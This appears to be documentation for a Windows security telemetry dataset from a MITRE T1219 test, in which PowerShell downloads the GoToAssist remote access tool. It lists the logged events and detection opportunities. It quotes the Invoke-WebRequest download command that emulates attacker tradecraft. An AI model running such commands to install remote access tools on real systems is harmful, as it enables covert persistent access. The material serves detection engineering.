# T1219-4: Remote Access Tools — GoToAssist Files Detected Test on Windows

## Technique Context

T1219 (Remote Access Tools) covers adversary use of legitimate commercial remote support software for persistent access and command-and-control. GoToAssist (now part of GoTo Resolve) is a commercial remote support tool from LogMeIn, broadly deployed in enterprise IT support workflows. Its legitimacy — signed binaries, known vendor infrastructure, real business use cases — makes it an effective tool for attackers operating in environments where it blends with existing activity.

The realistic threat scenario is: an attacker with initial access uses a scripting engine to download and silently install GoToAssist, then uses it for persistent interactive access while appearing to be an internal IT operator. Because GoToAssist's traffic goes to vendor-controlled relay infrastructure over HTTPS/443, it can be difficult to distinguish from legitimate use at the network level.

This test runs a PowerShell command to download GoToAssist from the vendor's dynamic launcher URL and execute it silently:

```
Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe
"https://launch.getgo.com/launcher2/helper?token=<long_token>&downloadTrigger=restart&renameFile=1"
```

The URL includes an authentication token, which is characteristic of vendor-generated installer links.

## What This Dataset Contains

**Security EID 4688** captures the PowerShell process spawning with the full GoToAssist download command:

```
"powershell.exe" & {Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe
"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_...
&downloadTrigger=restart&renameFile=1"}
```

The complete URL including the token parameter is preserved verbatim. The output path `C:\Users\$env:username\Downloads\GoToAssist.exe` is also directly visible (the environment variable is not yet resolved at log time).

**Sysmon EID 3 (Network Connection)** records `powershell.exe` (PID 16404) initiating a TCP connection to `173.199.10.228:443` — a LogMeIn/GoTo infrastructure IP. The connection was initiated from `192.168.4.16` (ACME-WS06) and represents the `Invoke-WebRequest` call to the GoToAssist launcher URL. This is the direct network evidence of a scripting engine reaching out to remote access vendor infrastructure.

**Sysmon EID 1** captures the child `powershell.exe` process (PID 16404) with the full GoToAssist download command line, confirming the network connection attribution. The process runs as `NT AUTHORITY\SYSTEM`.

**Sysmon EID 22 (DNS)** records a DNS query to `launch.getgo.com` from the PowerShell process, resolving the GoToAssist launcher domain.

The technique ultimately failed: the `$env:username` variable resolves to `ACME-WS06$` (the machine account name) when running as `SYSTEM`, and the path `C:\Users\ACME-WS06$\Downloads\` does not exist. PowerShell errors indicate the download could not complete. However, the network connection (Sysmon EID 3) confirms that the `Invoke-WebRequest` call did initiate — the failure occurred when writing the downloaded data to the non-existent path.

Total event counts: 0 Application, 127 PowerShell, 4 Security (EID 4688), 41 Sysmon.

The undefended dataset has 41 Sysmon events compared to 36 in the defended variant, with more events here likely reflecting Defender's absence allowing the network connection to proceed.

## What This Dataset Does Not Contain

Because the download ultimately failed (path not found), the GoToAssist binary was never written to disk. There are no **Sysmon EID 11** (file creation) events for `GoToAssist.exe`. The binary was not executed.

No evidence of GoToAssist actually running appears — no child processes spawned from the installer, no persistence mechanisms established. The dataset represents the delivery attempt, not the full deployment.

The **PowerShell channel** (127 events, predominantly EID 4104) contains test framework boilerplate. The `Invoke-WebRequest` call itself is visible in the Security EID 4688 command line and Sysmon EID 1, but the detailed PowerShell module invocation is not clearly represented in the 20-sample set.

## Assessment

Despite the execution failing at the file-write stage, this dataset contains high-quality detection artifacts. The network connection to GoTo infrastructure (`173.199.10.228:443`, `launch.getgo.com`) from a `powershell.exe` process running as `SYSTEM` is a strong behavioral indicator — legitimate GoToAssist usage does not initiate from SYSTEM context without user interaction. The GoToAssist launcher URL with its token parameter and `downloadTrigger=restart` flag in a PowerShell command line is a specific, searchable indicator. Compared to the defended variant, where the same failure occurred but Defender may have generated additional telemetry around the download attempt, this dataset shows the clean attempt with network telemetry intact.

## Detection Opportunities Present in This Data

The following behavioral observables are directly present in the event records:

- **Security EID 4688** contains `launch.getgo.com` in the PowerShell command line. Any process command line containing a remote access vendor URL as an argument to `Invoke-WebRequest` or a similar downloader is a strong indicator.
- **Sysmon EID 3** shows `powershell.exe` connecting to `173.199.10.228:443`. A PowerShell process making an outbound HTTPS connection to known remote access vendor IP ranges, particularly from a SYSTEM context, is worth alerting on regardless of whether the download succeeds.
- **Sysmon EID 22** records `launch.getgo.com` DNS resolution. Remote access vendor domains appearing in DNS query logs from automated processes (running as SYSTEM, with no interactive session) are an anomaly worth flagging.
- **Security EID 4688** shows the parent-child chain `powershell.exe` → `powershell.exe` with the download command. Nested PowerShell spawning carrying a vendor download URL is consistent with automated deployment tradecraft.
- The token parameter in the URL (`?token=...&downloadTrigger=restart&renameFile=1`) is specific to dynamically generated installer links. The presence of `downloadTrigger=restart` in any URL argument is a GoToAssist-specific indicator that differs from casual browser download.
